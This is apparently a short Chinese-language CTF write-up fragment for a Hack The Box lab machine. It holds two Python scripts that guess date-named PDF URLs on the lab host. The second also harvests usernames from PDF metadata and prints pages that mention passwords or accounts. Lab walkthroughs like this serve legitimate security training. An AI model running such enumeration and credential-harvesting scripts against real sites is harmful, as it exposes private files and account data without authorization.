# 有时间戳的文件

输出所有类似于 YYYY-MM-DD-upload.pdf所有的文件，具体文件格式自行修改

```clike
#!/usr/bin/env python3
import datetime
import requests
t = datetime.datetime(2020, 1, 1)  
end = datetime.datetime(2021, 7, 4) 
while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")  
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
```

从所有文件中提取铭感信息并将user信息输出到user

```clike
#!/usr/bin/env python3
import datetime
import io
import PyPDF2
import requests
t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()
while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
with open('users', 'w') as f:
    f.write('\n'.join(users)) 
```
